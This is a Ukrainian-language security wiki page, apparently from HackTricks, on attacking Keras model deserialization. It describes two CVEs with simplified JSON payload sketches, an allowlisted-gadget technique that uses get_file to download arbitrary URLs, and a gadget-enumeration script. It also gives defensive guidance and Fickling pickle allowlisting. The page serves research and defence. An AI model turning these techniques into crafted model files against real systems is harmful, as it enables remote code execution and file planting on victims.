# Keras: десеріалізація моделей — RCE та пошук гаджетів

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка підсумовує практичні техніки експлуатації проти конвеєра десеріалізації моделей Keras, пояснює внутрішню структуру нативного формату .keras та його поверхню атаки, а також надає набір інструментів для дослідників для пошуку Model File Vulnerabilities (MFVs) та post-fix гаджетів.

## Внутрішня структура формату .keras

Файл .keras — це ZIP-архів, що містить щонайменше:
- metadata.json – загальна інформація (наприклад, версія Keras)
- config.json – архітектура моделі (основна поверхня атаки)
- model.weights.h5 – ваги у HDF5

config.json керує рекурсивною десеріалізацією: Keras імпортує модулі, визначає класи/функції та відтворює шари/об'єкти з довідників, контрольованих зловмисником.

Приклад фрагмента для об'єкта шару Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Десеріалізація виконує:
- Імпорт модулів та розв'язання символів із ключів module/class_name
- Виклик from_config(...) або конструктора з kwargs під контролем атакувальника
- Рекурсія у вкладені об'єкти (activations, initializers, constraints, etc.)

Історично це надавало атакувальнику, який створює config.json, три примітиви:
- Контроль того, які модулі імпортуються
- Контроль того, які класи/функції розв'язуються
- Контроль kwargs, що передаються в конструкторах/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Причина:
- Lambda.from_config() використовувала python_utils.func_load(...), яка base64-decodes і викликає marshal.loads() на байтах атакувальника; Python unmarshalling може виконувати код.

Ідея експлойту (спрощений payload у config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras за замовчуванням застосовує safe_mode=True. Серіалізовані Python-функції в Lambda блокуються, якщо користувач явно не відмовляється від цього, вказавши safe_mode=False.

Notes:
- Legacy формати (older HDF5 saves) або старі codebases можуть не виконувати сучасних перевірок, тож “downgrade” style атаки можуть спрацювати, якщо жертви використовують старі loaders.

## CVE-2025-1550 – Довільний імпорт модулів у Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn використовував importlib.import_module() без обмежень з рядками модулів, контрольованими атакуючим, з config.json.
- Impact: Довільний імпорт будь-якого встановленого модуля (або модуля, підсіяного атакуючим на sys.path). Код, що виконується під час імпорту, запускається, після чого об'єкт створюється з kwargs, заданими атакуючим.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Покращення безпеки (Keras ≥ 3.9):
- Module allowlist: імпорти обмежені офіційними модулями екосистеми: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True блокує завантаження небезпечних Lambda серіалізованих функцій
- Basic type checking: десеріалізовані об'єкти повинні відповідати очікуваним типам

## Поверхня post-fix gadget всередині allowlist

Навіть з allowlisting та safe mode, серед дозволених Keras callables залишається широка поверхня. Наприклад, keras.utils.get_file може завантажувати довільні URL до місць, які вибирає користувач.

Gadget через Lambda, що посилається на дозволену функцію (не серіалізований Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Важливе обмеження:
- Lambda.call() додає вхідний тензор як перший позиційний аргумент при виклику цільового callable. Обрані gadgets повинні витримувати додатковий позиційний аргумент (або приймати *args/**kwargs). Це обмежує, які функції придатні.

Potential impacts of allowlisted gadgets:
- Довільне завантаження/запис (path planting, config poisoning)
- Мережеві callbacks/ефекти на зразок SSRF, залежно від середовища
- Ланцюжок до виконання коду, якщо записані шляхи згодом імпортуються/виконуються або додаються до PYTHONPATH, або якщо існує записувана локація, яка виконує код при записі

## Набір інструментів дослідника

1) Систематичне виявлення gadgets у дозволених модулях

Перерахуйте кандидатні callables у keras, keras_nlp, keras_cv, keras_hub і пріоритезуйте ті, що мають побічні ефекти на файли/мережу/процеси/середовище.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Пряме тестування десеріалізації (не потрібен .keras архів)

Подавайте створені dicts безпосередньо в Keras deserializers, щоб дізнатися, які params приймаються, і спостерігати побічні ефекти.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Перехресне тестування версій і форматів

Keras існує в кількох кодових базах/епохах з різними обмеженнями та форматами:
- TensorFlow вбудований Keras: tensorflow/python/keras (legacy, заплановано видалити)
- tf-keras: підтримується окремо
- Multi-backend Keras 3 (official): впроваджено нативний .keras

Повторюйте тести у кількох кодових базах та форматах (.keras vs legacy HDF5), щоб виявити регресії або відсутні захисні механізми.

## Захисні рекомендації

- Розглядайте файли моделей як недовірений вхід. Завантажуйте моделі лише з довірених джерел.
- Тримайте Keras оновленим; використовуйте Keras ≥ 3.9, щоб скористатися allowlisting та перевірками типів.
- Не встановлюйте safe_mode=False під час завантаження моделей, якщо ви повністю не довіряєте файлу.
- Розгляньте виконання десеріалізації в sandboxed, із найменшими привілеями, без виходу в мережу та з обмеженим доступом до файлової системи.
- За можливості застосовуйте allowlists/підписи для джерел моделей та перевірки цілісності.

## ML pickle import allowlisting for AI/ML models (Fickling)

Багато форматів моделей AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, старі артефакти TensorFlow тощо) містять вбудовані дані Python pickle. Атакуючі регулярно зловживають pickle GLOBAL imports та конструкторами об’єктів, щоб досягти RCE або підміни моделі під час завантаження. Сканери, що базуються на чорних списках, часто пропускають нові або не вказані небезпечні імпорти.

Практичним fail-closed захистом є перехоплення десеріалізатора Python pickle та дозволення лише перевіреного набору нешкідливих імпортів, пов'язаних з ML, під час unpickling. Trail of Bits’ Fickling реалізує цю політику й постачає куратований ML import allowlist, побудований на тисячах публічних Hugging Face pickles.

Модель безпеки для «безпечних» імпортів (інтуїції, виведені з досліджень і практики): імпортовані символи, які використовує pickle, мають одночасно:
- Не виконувати код і не спричиняти виконання (немає скомпільованих/джерельних об’єктів коду, викликів оболонки, хуків тощо)
- Не отримувати/не встановлювати довільні атрибути або елементи
- Не імпортувати і не отримувати посилання на інші Python-об’єкти з pickle VM
- Не викликати жодні вторинні десеріалізатори (наприклад, marshal, nested pickle), навіть опосередковано

Увімкніть захисти Fickling якомога раніше під час старту процесу, щоб будь-які завантаження pickle, що виконуються фреймворками (torch.load, joblib.load тощо), перевірялися:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Операційні поради:
- Ви можете тимчасово disable/re-enable the hooks за потреби:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Якщо заблоковано known-good model, розширте allowlist для вашого середовища після перегляду символів:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling також надає загальні засоби захисту під час виконання, якщо ви віддаєте перевагу більш деталізованому контролю:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Надавайте перевагу форматам моделей, які не використовують pickle, коли це можливо (наприклад, SafeTensors). Якщо потрібно приймати pickle, запускайте завантажувачі з мінімальними привілеями, без виходу в мережу, і застосовуйте allowlist.

Ця allowlist-first стратегія наочно блокує типові шляхи експлуатації ML pickle, зберігаючи при цьому високу сумісність. У бенчмарку ToB, Fickling позначив 100% синтетичних шкідливих файлів і дозволив ~99% чистих файлів з провідних репозиторіїв Hugging Face.

## Посилання

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
